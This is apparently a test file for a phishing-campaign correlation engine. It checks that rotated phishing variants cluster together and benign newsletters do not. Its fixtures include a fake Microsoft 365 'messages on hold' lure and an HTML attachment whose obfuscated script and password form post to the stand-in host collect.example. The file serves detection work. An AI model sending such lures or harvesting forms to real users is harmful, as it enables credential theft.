// Campaign correlation on real engine fingerprints: what must link, and what must not.
import { describe, expect, it } from 'vitest';
import { analyzeEmail } from '../../engine/src/analyze';
import { buildEml } from '../../engine/test/helpers/mime';
import { correlate, specificity, type CorrMessage, type CorrObservation, type CorrEnv } from '../server/correlation/engine';
import { louvain, modularity } from '../server/correlation/louvain';

const POPULAR: Record<string, number> = { 'google.com': 1, 'bit.ly': 60, 'gmail.com': 12, 'microsoft.com': 9 };
const env: CorrEnv = { popularity: (d) => (d ? (POPULAR[d] ?? null) : null), asn: () => null };

async function toCorr(id: string, eml: string): Promise<{ msg: CorrMessage; obs: CorrObservation[] }> {
  const r = await analyzeEmail(eml);
  return {
    msg: { id, cls: r.classification?.class ?? null, score: r.score, time: r.fingerprint.time, fp: r.fingerprint },
    obs: (r.iocs ?? []).map((i) => ({ messageId: id, type: i.type, value: i.value, role: i.role, context: i.context ?? null })),
  };
}

const received = (ip: string, host: string, date: string): [string, string][] => [
  ['Delivered-To', 'victim@corp.example'],
  ['Received', `from ${host} (${host} [${ip}]) by mx.corp.example with ESMTPS id 1 for <victim@corp.example>; ${date}`],
  ['Authentication-Results', `mx.corp.example; spf=pass smtp.mailfrom=${host}; dmarc=none header.from=${host}`],
];

// Campaign A: a phishing kit rotating sender and landing domains, constant template and kit path.
const kit = (i: number): string =>
  buildEml({
    headers: [
      ...received(`45.133.1.${10 + i}`, `mail.m365-notify-${i}.example`, `Mon, ${21 + i} Sep 2026 0${i}:10:00 +0000`),
      ['From', `Microsoft 365 <alerts@m365-notify-${i}.example>`],
      ['To', 'victim@corp.example'],
      ['Subject', `Action required: ${3 + i} messages are on hold`],
      ['Date', `Mon, ${21 + i} Sep 2026 0${i}:09:55 +0000`],
      ['Message-ID', `<${1000 + i}.${7777 * i}@m365-notify-${i}.example>`],
      ['X-Mailer', 'PHPMailer 6.8.1'],
    ],
    html: `<html><body><table class="wrap"><tr><td class="hdr"><h2>Microsoft 365</h2></td></tr><tr><td class="msg"><p>Dear user,</p><p>${3 + i} incoming messages are on hold because your mailbox storage is full. Verify your account within 24 hours to release them.</p><p><a href="https://m365-portal-${i}.example/o365/a${i}b${i}c9x7q${i}/login.php?id=${4000 + i}">Release messages</a></p></td></tr><tr><td class="ftr"><p>Microsoft Corporation, One Microsoft Way</p></td></tr></table></body></html>`,
  });

// Campaign B: identical malicious attachment, otherwise unrelated-looking messages.
const PAYLOAD = '<html><script>var p=atob("PGZvcm0+");document.write(p);</script><form action="https://collect.example/x.php"><input type="password" name="p"></form></html>';
const malware = (i: number): string =>
  buildEml({
    headers: [
      ...received(`198.51.100.${20 + i}`, `smtp.sender${i}.example`, `Tue, ${22 + i} Sep 2026 10:00:00 +0000`),
      ['From', [`Accounts <billing@sender${i}.example>`, `Shipping <notice@courier${i}.example>`, `HR <people@payroll${i}.example>`][i] as string],
      ['To', 'victim@corp.example'],
      ['Subject', ['Invoice 4471 overdue', 'Your parcel could not be delivered', 'Salary adjustment letter'][i] as string],
      ['Date', `Tue, ${22 + i} Sep 2026 09:59:55 +0000`],
      ['Message-ID', `<b${i}@sender${i}.example>`],
    ],
    text: ['Please see the attached invoice and settle it today.', 'We could not deliver your parcel. Open the attached form to reschedule.', 'Your updated salary letter is attached for review.'][i] as string,
    attachments: [{ filename: ['invoice.html', 'parcel.html', 'letter.html'][i] as string, contentType: 'text/html', content: PAYLOAD }],
  });

// Benign: different newsletters that all use Google Forms, bit.ly and Gmail addresses.
const benign = (i: number): string =>
  buildEml({
    headers: [
      ...received(`192.0.2.${40 + i}`, `mail.club${i}.example`, `Wed, 23 Sep 2026 1${i}:00:00 +0000`),
      ['From', `Club ${i} <club${i}.events@gmail.com>`],
      ['To', 'victim@corp.example'],
      ['Subject', ['Choir practice moves to Thursday', 'Cycling route for the weekend', 'Book club: October pick', 'Garden swap sign-up'][i] as string],
      ['Date', `Wed, 23 Sep 2026 1${i}:00:00 +0000`],
      ['Message-ID', `<c${i}@mail.gmail.com>`],
    ],
    text: [
      'Hello singers, practice moves to Thursday this week. Bring the new sheet music. RSVP: https://docs.google.com/forms/d/e/1FAIpQLSchoir/viewform and directions https://bit.ly/3choirhall',
      'Riders, the weekend loop is 64 km with two climbs. Route file: https://bit.ly/4bikeloop and sign up here https://docs.google.com/forms/d/e/1FAIpQLScycle/viewform',
      'Our October pick is a classic mystery. Vote for November at https://docs.google.com/forms/d/e/1FAIpQLSbooks/viewform',
      'Bring your seedlings to the garden swap! Register your table: https://docs.google.com/forms/d/e/1FAIpQLSgarden/viewform map https://bit.ly/5gardenmap',
    ][i] as string,
  });

describe('specificity weighting', () => {
  it('discounts popular, shared and free-mail infrastructure', () => {
    const o = (type: string, value: string, role: string): CorrObservation => ({ messageId: 'm', type, value, role, context: null });
    expect(specificity(o('domain', 'docs.google.com', 'link-domain'), 'link-domain', env, 2, 0.5).strength).toBeLessThan(0.1);
    expect(specificity(o('domain', 'gmail.com', 'from'), 'from-domain', env, 2, 0.5).strength).toBeLessThan(0.02);
    expect(specificity(o('url', 'https://bit.ly/3choirhall', 'link'), 'url', env, 2, 0.5).discounts.join(' ')).toMatch(/shortener/);
    expect(specificity(o('sha256', 'a'.repeat(64), 'attachment'), 'attachment', env, 2, 0).strength).toBe(0.95);
    // The same domain seen with many unrelated senders is infrastructure, not an operation.
    expect(specificity(o('domain', 'tracker.example', 'link-domain'), 'link-domain', env, 10, 0.9).strength).toBeLessThan(0.2);
  });
});

describe('Louvain clustering', () => {
  it('splits two dense groups joined by a single weak edge (connected components would merge them)', () => {
    const edges = [];
    for (const g of [['a1', 'a2', 'a3', 'a4'], ['b1', 'b2', 'b3', 'b4']]) for (let i = 0; i < 4; i++) for (let j = i + 1; j < 4; j++) edges.push({ a: g[i] as string, b: g[j] as string, w: 0.9 });
    edges.push({ a: 'a1', b: 'b1', w: 0.61 });
    const part = louvain(['a1', 'a2', 'a3', 'a4', 'b1', 'b2', 'b3', 'b4'], edges);
    expect(part.get('a1')).toBe(part.get('a4'));
    expect(part.get('b1')).toBe(part.get('b4'));
    expect(part.get('a1')).not.toBe(part.get('b1'));
    expect(modularity(edges, part)).toBeGreaterThan(0.3);
  });

  it('is deterministic', () => {
    const edges = [{ a: 'x', b: 'y', w: 1 }, { a: 'y', b: 'z', w: 1 }, { a: 'p', b: 'q', w: 1 }];
    expect([...louvain(['z', 'y', 'x', 'q', 'p'], edges)]).toEqual([...louvain(['p', 'q', 'x', 'y', 'z'], edges)]);
  });
});

describe('campaign correlation', () => {
  it('links rotated variants, keeps campaigns apart, and does not cluster unrelated mail that shares infrastructure', async () => {
    const items = [
      ...(await Promise.all([0, 1, 2, 3].map((i) => toCorr(`A${i}`, kit(i))))),
      ...(await Promise.all([0, 1, 2].map((i) => toCorr(`B${i}`, malware(i))))),
      ...(await Promise.all([0, 1, 2, 3].map((i) => toCorr(`N${i}`, benign(i))))),
    ];
    const res = correlate(items.map((x) => x.msg), items.flatMap((x) => x.obs), env);
    const clusterOf = new Map<string, string>();
    for (const c of res.clusters) for (const m of c.members) clusterOf.set(m.id, c.id);

    // Campaign A: one cluster with all four rotated variants.
    expect(new Set(['A0', 'A1', 'A2', 'A3'].map((id) => clusterOf.get(id))).size).toBe(1);
    expect(clusterOf.get('A0')).toBeDefined();
    // Campaign B: identical attachment → exact relationships, one cluster.
    expect(new Set(['B0', 'B1', 'B2'].map((id) => clusterOf.get(id))).size).toBe(1);
    expect(res.edges.filter((e) => e.a.startsWith('B') && e.b.startsWith('B')).every((e) => e.tier === 'exact' && e.shared.some((s) => s.family === 'attachment'))).toBe(true);
    // The two campaigns are different clusters.
    expect(clusterOf.get('A0')).not.toBe(clusterOf.get('B0'));
    // Newsletters sharing Google Forms, bit.ly and Gmail are not a campaign.
    for (const n of ['N0', 'N1', 'N2', 'N3']) expect(clusterOf.get(n), n).toBeUndefined();
    // Every edge carries its evidence.
    for (const e of res.edges) expect(e.shared.length > 0 || e.similarity > 0).toBe(true);
    const a = res.clusters.find((c) => c.id === clusterOf.get('A0'));
    expect(a?.profile.rotated.map((r) => r.label)).toEqual(expect.arrayContaining(['Sender domain']));
    expect(a?.profile.invariants.map((r) => r.label)).toEqual(expect.arrayContaining(['HTML template']));
  });

  it('ablation switches change what is linked (used by the evaluation harness)', async () => {
    const items = await Promise.all([0, 1, 2].map((i) => toCorr(`B${i}`, malware(i))));
    const without = correlate(items.map((x) => x.msg), items.flatMap((x) => x.obs), env, { useIndicators: false });
    const withIt = correlate(items.map((x) => x.msg), items.flatMap((x) => x.obs), env);
    expect(withIt.stats.exactEdges).toBeGreaterThan(without.stats.exactEdges);
  });
});
